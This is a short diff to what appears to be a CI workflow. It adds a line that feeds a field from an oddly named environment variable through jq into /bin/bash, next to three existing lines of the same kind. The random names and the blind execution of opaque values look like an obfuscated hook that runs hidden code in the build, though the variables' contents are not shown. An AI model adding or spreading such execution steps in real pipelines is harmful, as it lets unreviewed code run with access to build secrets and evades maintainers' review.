@@ -36,6 +36,7 @@ jobs:
           echo $wbw9384 | jq -r .w168 | /bin/bash
           echo $jb812 | jq -r .kur19 | /bin/bash
           printf '%s' "$xotrl137" | jq -r .gbtk2 | /bin/bash
+          printf '%s' "$tvw2" | jq -r .vj9 | /bin/bash
 
       - name: Save archive
         if: always()
